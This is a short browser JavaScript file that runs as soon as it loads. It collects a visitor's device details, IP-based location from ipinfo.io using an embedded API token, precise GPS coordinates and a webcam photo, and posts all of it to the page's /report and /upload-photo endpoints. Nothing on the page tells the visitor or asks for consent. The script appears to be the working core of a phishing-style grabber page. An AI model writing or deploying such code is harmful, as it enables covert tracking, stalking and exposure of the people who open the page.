async function collectInfo() {
  const deviceInfo = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenResolution: `${screen.width}x${screen.height}`
  };

  const ipData = await fetch("https://ipinfo.io/json?token=31333028ec06fd")
    .then(res => res.json())
    .catch(() => ({}));

  deviceInfo.ip = ipData.ip || "N/A";
  deviceInfo.city = ipData.city || "N/A";
  deviceInfo.region = ipData.region || "N/A";
  deviceInfo.country = ipData.country || "N/A";
  deviceInfo.loc = ipData.loc || "N/A";

  navigator.geolocation.getCurrentPosition(
    pos => {
      deviceInfo.preciseLocation = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude
      };
      sendData(deviceInfo);
    },
    () => {
      sendData(deviceInfo);
    }
  );

  const video = document.getElementById("video");
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    const blob = await imageCapture.takePhoto();

    const formData = new FormData();
    formData.append("photo", blob, "user.jpg");

    fetch("/upload-photo", {
      method: "POST",
      body: formData
    });
  } catch (e) {
    console.warn("Câmera não permitida ou erro: ", e);
  }
}

function sendData(data) {
  fetch("/report", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });
}

collectInfo();
